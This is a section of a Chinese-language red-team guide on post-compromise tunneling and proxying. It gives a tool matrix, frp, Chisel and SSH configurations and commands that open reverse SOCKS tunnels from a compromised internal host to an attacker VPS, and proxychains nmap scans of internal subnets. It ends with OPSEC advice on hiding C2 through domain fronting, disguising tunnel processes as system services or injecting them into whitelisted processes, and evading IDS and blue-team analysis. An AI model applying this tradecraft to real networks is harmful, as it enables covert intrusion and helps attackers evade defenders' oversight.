## 三、隧道与代理

### 3.1 隧道技术矩阵

| 技术 | 工具 | 场景 | 检测难度 |
|------|------|------|---------|
| SOCKS5 代理 | frp/Chisel/rpivot/ligolo-ng | 通用 TCP 代理 | 中 |
| HTTP 代理 | Neo-reGeorg/Tunna/regressh | WebShell 代理 | 中 |
| ICMP 隧道 | ptunnel/icmpsh | 严格防火墙 | 低（少见） |
| DNS 隧道 | dnscat2/iodine | 仅 DNS 出口 | 低（特征明显） |
| SSH 隧道 | ssh -D/-L/-R | 有 SSH 访问 | 中 |
| 多级代理 | frpc→frps→proxychains | 多层内网 | 中 |
| WebSocket | Chisel over WSS | WAF 穿透 | 低 |
| HTTP/3、QUIC | quic 隧道 | 高级出口过滤 | 低 |
| C2 自带隧道 | Cobalt Strike/Sliver pivot | 与 C2 一体化 | 中 |

### 3.2 隧道搭建流程（frp / Chisel / SSH）

```bash
# frp（稳定高效）
# 服务端 frps.ini
[common]
bind_port = 7000
token = password
# 客户端 frpc.ini
[common]
server_addr = vps_ip
server_port = 7000
token = password
[socks5]
type = tcp
remote_port = 6000
plugin = socks5

# Chisel（单二进制，轻量，推荐内网）
# 服务端（VPS）
chisel server --port 8080 --reverse
# 客户端（内网靶机）
chisel client vps:8080 R:socks
# 可加 --fingerprint 双向校验防止中间人

# SSH 动态转发
ssh -D 1080 -N -f user@target       # 本地 SOCKS5
ssh -R 7000:127.0.0.1:7000 user@vps # 反向隧道（出网受限时）

# proxychains 使用
# /etc/proxychains4.conf
socks5 127.0.0.1 6000
proxychains nmap -sT -Pn 10.0.0.0/24
```

### 3.3 高级隧道与防火墙穿透
```
- 端口复用：利用已开放的 80/443 端口做隧道（frp tcp_mux / http_proxy 插件）
- 协议封装：SOCKS 封装在 HTTP/WebSocket/DNS/ICMP 中
- 域前置（Domain Fronting）：利用 CDN 白名单域名隐藏 C2 真实目标
- CDN/云函数反代：C2 流量经云函数/CDN 转发，隐藏 VPS 真实 IP
- 时间策略：业务高峰时段通信，流量隐藏在大量正常请求中
- 流量伪装：TLS 指纹（JA3）伪装成 Chrome/Edge、Header 注入噪声（参考 intranet 技能 C2 章节）
```

### 3.4 代理链与路由规划
```bash
# 多级代理：A(打点机) → B(跳板) → C(目标网段)
# 每一级分别起 frp/chisel socks，proxychains 指向上一级
# 动态路由建议
proxychains4 -q nmap -sT -Pn -p 445,3389,5985 --top-ports 20 172.16.0.0/24
# 按网段分批扫描避免全量 ICMP 惊动 IDS
```

### 3.5 隧道 OPSEC
- 隧道进程改名/伪装成系统服务（`--service` 安装、进程注入白名单进程）
- 加密所有隧道流量（TLS/SSH），避免明文 SOCKS 被蓝队抓包分析
- 单一隧道端口绑定固定源 IP，必要时做限速（避免大流量扫描特征）
- 关键跳板机保持"原生状态"，工具用后即删（内存加载优先）

